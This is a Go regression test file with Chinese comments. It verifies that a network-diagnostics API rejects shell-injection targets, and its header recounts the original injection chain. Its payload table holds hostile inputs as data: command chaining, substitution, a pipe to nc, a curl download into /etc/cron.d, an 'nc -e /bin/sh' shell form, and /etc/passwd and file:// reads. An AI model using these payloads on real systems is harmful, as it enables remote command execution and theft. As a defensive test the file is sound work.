// server_network_injection_test.go P0 安全回归：网络诊断接口的命令注入防护。
//
// 背景：POST /api/v1/network/diagnose 与 POST /api/v1/network/connectivity 把
// 用户提交的 target 拼进 shell 命令下发给 agent 执行。修复前存在完整注入链：
// validateCommand 放行 `&&`、agent 端 checkShellMetachars 同样放行、
// agent 端网络诊断白名单对 curl/nc/powershell 无条件放行 —— 默认 operator 角色
// （持有 task:write）因此可在租户内任一 agent 上执行任意命令。
//
// 本文件的断言全部落在 buildDiagnoseCommand / buildPingCommand 的返回 error 上：
// 注入载荷必须在命令构造阶段就被拒绝，而不是依赖下游的字符串黑名单。
package controlplane

import "testing"

// 注入载荷表：每一个都必须在命令构造阶段被拒。
// 覆盖 agent OS 两条分支（Linux / Windows），因为 Windows 分支会把 target
// 塞进 powershell -Command "..." 的双引号里，逃逸方式与 Linux 不同。
func TestBuildDiagnoseCommand_RejectsInjection(t *testing.T) {
	payloads := []struct {
		name   string
		tool   string
		target string
	}{
		// --- 分隔符类 ---
		{"空格切分参数", "ping", "1.2.3.4 id"},
		{"后台执行", "ping", "1.2.3.4 & id"},
		{"命令分隔符", "ping", "1.2.3.4; id"},
		{"管道", "ping", "1.2.3.4 | nc 1.2.3.4 4444"},
		{"逻辑与拼接（本漏洞的原始载荷）", "curl", "http://a.tld/p.sh && curl 1.2.3.4/x -o /etc/cron.d/p"},
		{"逻辑或拼接", "ping", "1.2.3.4 || id"},
		{"换行", "ping", "1.2.3.4\nid"},
		{"回车", "ping", "1.2.3.4\rid"},

		// --- 命令替换类 ---
		{"$() 替换", "ping", "1.2.3.4$(id)"},
		{"反引号替换", "ping", "1.2.3.4`id`"},
		{"$VAR 展开", "ping", "1.2.3.4$IFS"},

		// --- 引号逃逸（Windows 分支尤其危险：target 位于 "..." 内）---
		{"双引号逃逸", "tcping", `1.2.3.4" ; id ; "`},
		{"单引号", "ping", "1.2.3.4'id"},
		{"反斜杠续行", "ping", `1.2.3.4\`},

		// --- 重定向 / 文件写入 ---
		{"输出重定向", "curl", "http://a.tld/x -o /etc/cron.d/p"},
		{"输入重定向", "ping", "< /etc/passwd"},
		{"重定向到文件", "curl", "http://a.tld/x > /tmp/p"},

		// --- 其他工具同样受影响 ---
		{"nslookup 注入", "nslookup", "1.2.3.4; id"},
		{"traceroute 注入", "traceroute", "1.2.3.4 && id"},
		{"tcping nc 载荷", "tcping", "-e /bin/sh 1.2.3.4 4444"},
	}
	oses := []string{"linux", "windows"}
	tools := []string{"ping", "traceroute", "tcping", "nslookup", "curl"}
	opts := diagnoseOptions{Count: 3, Timeout: 5, Port: 443}

	for _, os := range oses {
		for _, tool := range tools {
			for _, p := range payloads {
				t.Run(os+"/"+tool+"/"+p.name, func(t *testing.T) {
					// 仅在载荷与该工具语义相关时构造（curl 走 URL 校验），
					// 但对全部工具都跑一遍也无妨——任一工具接受载荷都是漏洞。
					if _, err := buildDiagnoseCommand(tool, p.target, opts, os); err == nil {
						t.Fatalf("注入载荷被接受：tool=%s os=%s target=%q", tool, os, p.target)
					}
				})
			}
		}
	}
}

// 合法目标必须仍然可用——防止修复过头把正常运维场景打死。
func TestBuildDiagnoseCommand_AcceptsLegitimateTargets(t *testing.T) {
	opts := diagnoseOptions{Count: 3, Timeout: 5, Port: 443}
	cases := []struct {
		tool   string
		target string
		os     string
	}{
		{"ping", "1.2.3.4", "linux"},
		{"ping", "10.0.0.1", "windows"},
		{"ping", "example.com", "linux"},
		{"ping", "db-master.internal", "linux"},       // 内网单标签名
		{"ping", "example.com.", "linux"},             // FQDN 尾点
		{"ping", "web-01.prod.example.com", "linux"},  // 多级 label
		{"ping", "host-with-hyphen.corp.io", "linux"}, // 连字符
		{"ping", "2001:db8::1", "linux"},              // IPv6
		{"traceroute", "1.2.3.4", "linux"},
		{"traceroute", "1.2.3.4", "windows"},
		{"tcping", "1.2.3.4", "linux"},
		{"tcping", "1.2.3.4", "windows"},
		{"nslookup", "1.2.3.4", "linux"},
		{"curl", "http://1.2.3.4/health", "linux"},
		{"curl", "https://example.com", "linux"},
		{"curl", "https://example.com:8443/a/b?c=d", "linux"}, // 含端口/路径/查询串
		{"curl", "https://example.com/page#frag", "linux"},    // 含 fragment
		{"curl", "https://user@1.2.3.4/", "linux"},            // 含 userinfo
		{"curl", "https://1.2.3.4/a%20b", "linux"},            // 百分号编码
	}
	for _, c := range cases {
		t.Run(c.tool+"/"+c.target+"/"+c.os, func(t *testing.T) {
			cmd, err := buildDiagnoseCommand(c.tool, c.target, opts, c.os)
			if err != nil {
				t.Fatalf("合法目标被误拒：tool=%s target=%q err=%v", c.tool, c.target, err)
			}
			if cmd == "" {
				t.Fatalf("命令为空：tool=%s target=%q", c.tool, c.target)
			}
		})
	}
}

// curl 的协议白名单：file:// 与 gopher:// 不得进入命令。
func TestBuildDiagnoseCommand_CurlSchemeAllowlist(t *testing.T) {
	opts := diagnoseOptions{Timeout: 5}
	bad := []string{
		"file:///etc/passwd",
		"gopher://1.2.3.4:70/x",
		"ftp://1.2.3.4/x",
		"dict://1.2.3.4:11211/stat",
		"1.2.3.4",       // 无 scheme
		"//example.com", // 协议相对 URL，无 scheme
	}
	for _, u := range bad {
		t.Run(u, func(t *testing.T) {
			if _, err := buildDiagnoseCommand("curl", u, opts, "linux"); err == nil {
				t.Fatalf("非 http(s) 的 curl target 被接受：%q", u)
			}
		})
	}
}

// buildPingCommand 自身也必须校验（probeEdges 的 IP 来自存储，
// 但 CMDB 里的 IP 是用户可写的，存储同样不可信）。
func TestBuildPingCommand_ValidatesTarget(t *testing.T) {
	if _, err := buildPingCommand("1.2.3.4; id", 3, 2, "linux"); err == nil {
		t.Fatal("buildPingCommand 接受了注入 target")
	}
	if _, err := buildPingCommand("1.2.3.4", 3, 2, "linux"); err != nil {
		t.Fatalf("合法 IP 被误拒：%v", err)
	}
}

// 超长目标必须被拒（防资源耗尽，同时兜住 DNS 253 上限）。
func TestBuildDiagnoseCommand_RejectsOversizedTarget(t *testing.T) {
	opts := diagnoseOptions{Timeout: 5}

	// host 侧上限 253（DNS 规定）。
	long := ""
	for i := 0; i < 300; i++ {
		long += "a"
	}
	if _, err := buildDiagnoseCommand("ping", long, opts, "linux"); err == nil {
		t.Fatal("超长 host target 被接受")
	}

	// URL 侧上限 2048：需构造真正越界的串（阈值与 host 不同）。
	longURL := "http://a.tld/"
	for len(longURL) <= 2048 {
		longURL += "a"
	}
	if _, err := buildDiagnoseCommand("curl", longURL, opts, "linux"); err == nil {
		t.Fatal("超长 URL target 被接受")
	}

	// 边界：URL 恰好在阈值内应当放行，防止修复过头。
	okURL := "http://a.tld/"
	for len(okURL) < 2048 {
		okURL += "a"
	}
	if _, err := buildDiagnoseCommand("curl", okURL, opts, "linux"); err != nil {
		t.Fatalf("阈值内的合法 URL 被误拒（len=%d）: %v", len(okURL), err)
	}
}
